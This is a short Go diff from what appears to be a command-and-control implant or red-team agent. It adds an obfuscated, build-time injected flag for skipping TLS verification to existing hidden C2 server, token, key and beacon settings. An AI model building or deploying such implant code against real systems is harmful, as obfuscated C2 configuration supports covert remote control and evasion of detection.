@@ -30,6 +30,8 @@ var (
 	ldC2PSK string
 	// ldC2BeaconURL is the XOR+hex-encoded explicit HTTP beacon URL.
 	ldC2BeaconURL string
+	// ldC2InsecureTLS is the XOR+hex-encoded InsecureTLS flag ("1" to skip TLS verify).
+	ldC2InsecureTLS string
 )
 
 // ldDecode reverses the build-time encoding (hex -> XOR with obfKey). An
@@ -51,5 +53,11 @@ func ldInjected() bool {
 	return strings.TrimSpace(ldC2Server) != "" ||
 		strings.TrimSpace(ldC2AuthToken) != "" ||
 		strings.TrimSpace(ldC2PSK) != "" ||
-		strings.TrimSpace(ldC2BeaconURL) != ""
+		strings.TrimSpace(ldC2BeaconURL) != "" ||
+		strings.TrimSpace(ldC2InsecureTLS) != ""
+}
+
+// ldInsecureTLS returns true if a build-time InsecureTLS flag was injected as "1".
+func ldInsecureTLS() bool {
+	return ldDecode(ldC2InsecureTLS) == "1"
 }
